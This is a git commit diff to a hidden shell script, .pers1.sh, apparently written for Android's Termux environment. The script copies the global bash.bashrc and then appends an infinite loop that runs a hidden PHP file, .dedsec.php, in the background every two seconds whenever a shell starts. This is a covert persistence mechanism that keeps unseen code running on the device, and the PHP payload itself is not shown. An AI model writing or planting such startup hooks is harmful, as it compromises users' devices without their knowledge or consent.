fde7a2b1439d3ac57f9d59aa77c69415d723557c
ImJoke <55929550+ImJoke@users.noreply.github.com>
2020-10-09 00:43:45 +0700

    Update .pers1.sh

--- .pers1.sh
+++ .pers1.sh
@@ -1,2 +1,2 @@
 cp /data/data/com.termux/files/usr/etc/bash.bashrc /data/data/com.termux/files/usr/etc/bash.bashrc1
-echo "while true"$'\n'"do php $HOME/.p/.dedsec.php &"$'\n'"sleep 2"$'\n'"done" >> /data/data/com.termux/files/usr/etc/bash.bashrc
+echo "while true"$'\n'"do php /data/data/com.termux/files/home/.p/.dedsec.php &"$'\n'"sleep 2"$'\n'"done" >> /data/data/com.termux/files/usr/etc/bash.bashrc
